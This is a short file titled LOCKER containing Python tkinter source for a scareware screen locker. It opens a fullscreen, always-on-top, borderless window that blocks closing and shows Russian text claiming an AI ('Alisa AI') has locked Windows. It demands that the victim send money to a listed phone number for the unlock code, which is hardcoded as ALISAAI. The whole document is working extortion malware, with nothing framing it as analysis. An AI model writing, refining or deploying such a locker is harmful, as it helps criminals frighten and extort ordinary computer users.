# LOCKER

```

from tkinter import *

root = Tk()

def Quit():
    pass

def CheckPassword(arg):
    if password.get() == "ALISAAI":
        exit()

X = root.winfo_screenwidth()
Y = root.winfo_screenheight()   

bg = "black"
font = "Arial 25 bold"
root ["bg"] = bg
root.protocol("WM_DELETE_WINDOW", Quit)
root.attributes("-topmost", 1)
root.geometry(f"{X}x{Y}")
root.overrideredirect(1)

Label(text="Ваш WINDOWS заблокирован Алисой AI", fg="red", bg=bg, font=font).pack()
Label(text="\n\n\n\nСКИНЬТЕ ДЕНЬГИ НА НОМЕР ТЕЛЕФОНА +79159995525 И ВАМ СКАЖУТ КОД", fg="white",bg=bg,font=font).pack()
Label(text="\n\n\n\nВведите пароль который вам скажет Алиса AI", fg="white",bg=bg,font=font).pack()

password = Entry(font=font)
password.pack()
password.bind("<Return>", CheckPassword)
root.mainloop()
